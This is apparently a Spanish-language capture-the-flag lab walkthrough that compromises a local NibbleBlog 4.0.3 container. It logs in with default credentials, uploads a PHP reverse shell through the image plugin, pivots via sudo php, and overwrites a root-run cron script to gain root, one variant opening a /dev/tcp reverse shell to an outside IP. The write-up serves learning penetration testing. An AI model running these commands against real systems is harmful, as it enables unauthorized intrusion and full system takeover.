PORT   STATE SERVICE
80/tcp open  http

-Hacemos enumeración web y encontramos el directorio /nibbleblog

-NibbleBlog es un CMS , el cual tiene una vulnerabilidad de 'Arbitrary File Upload' en su version 4.0.3

-En esta ruta '-http://172.17.0.2/nibbleblog/themes/echo/config.bit' , confirmamos que estamos ante la versión 4.0

-Para explotar la vulnerabilidad debemos estar autenticados.

-En la siguiente ruta encontramos que existe un usuario 'admin':
	-http://172.17.0.2/nibbleblog/content/private/users.xml

-Nos vamos al panel de login '/admin' y probamos con las siguientes credenciales:
	-User: admin   -Password: admin

-Ha funcionado!! , estamos dentro del dashboard

-Nos vamos a la sección de plugins y seleccinamos el de 'My image'. Subimos la rs de Pentest Monkey 

-La ejecutamos desde la siguiente ruta:
	-http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php

-Estamos dentro:
	www-data@87a88c4a22be:/$


## Escalada de Privilegios

-Investigamos los archivos de BD pero no encontramos nada interesante

-sudo -l:
	(chocolate) NOPASSWD: /usr/bin/php

-Abusamos de /usr/bin/php para pivotar al usuario 'chocolate'
	-CMD="/bin/sh"
	-sudo -u chocolate  /usr/bin/php -r "system('$CMD');"
	chocolate@87a88c4a22be:

-Listamos los archivos que pertenecen al usuario chocolate:
	-find / -user chocolate 2>/dev/nulll
	Salen demasiados archivos pertenecientes a la carpeta /proc
	
-Listamos de nuevo excluyendo los archivos de la carpeta /proc
	-find / -user chocolate ! -path "/proc/*" 2>/dev/null

-Encontramos el siguiente archivo: /opt/script.php:
	-rw-r--r-- 1 chocolate chocolate 59 May  7  2024 /opt/script.php

-Analizamos los procesos que corren en el sistema:
	-2 Formas:
		1-ps -faux: Muestra información detallada sobre los procesos en ejecución en un sistema
			USER        COMMAND
			root        /bin/sh -c service apache2 start && while true; do php /opt/script.php; sleep 5; done
		-Vemos como el usuario root está ejecutando el archivo mediante una tarea cron
		2-Pspy64: Identifica tareas o comandos que se estén ejecutando en el sistema a intervalos regulares de tiempo:
			UID=0  (root)    | /bin/sh -c service apache2 start && while true; do php /opt/script.php; sleep 5; done 
			-Cada 5 segundos root ejecuta el script '/opt/script.php'

-Ya que hemos visto que el usuario 'root' está ejecutando el archivo '/opt/script.php' a través de una tarea CRON y nosotros bajo el usuario 'chocolate' tenemos permisos para modificar el script, vamos a modificarlo para escalar a root:
	-Intentamos: echo 'chmod +s /bin/bash' > /opt/script.php
	-No funciona por que tiene que ir entre etiquetas <php>
	-echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php (Solo funciona si añadimos la 'u')
	-root@87a88c4a22be:/# whoami
	root
	-Otra forma: echo "<?php exec('/bin/bash -c \'bash -i >& /dev/tcp/192.168.1.135/1234 0>&1\''); ?>" > /opt/script.php
	-root@87a88c4a22be:/# whoami
	root


